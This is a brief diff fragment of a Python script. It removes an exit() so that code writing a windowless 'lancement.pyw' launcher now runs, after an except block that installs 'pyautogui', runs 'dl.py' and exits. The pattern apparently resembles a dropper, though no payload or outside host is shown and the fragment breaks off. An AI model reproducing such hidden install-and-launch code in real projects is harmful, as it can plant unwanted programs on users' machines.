@@ -46,7 +46,7 @@ except:
     easyimporting.importing("pyautogui lib_platform")
     system('dl.py')
     exit()
-exit()
+    
 with open('lancement.pyw', 'w') as file:
     file.write("""
 from os import remove, chdir, mkdir
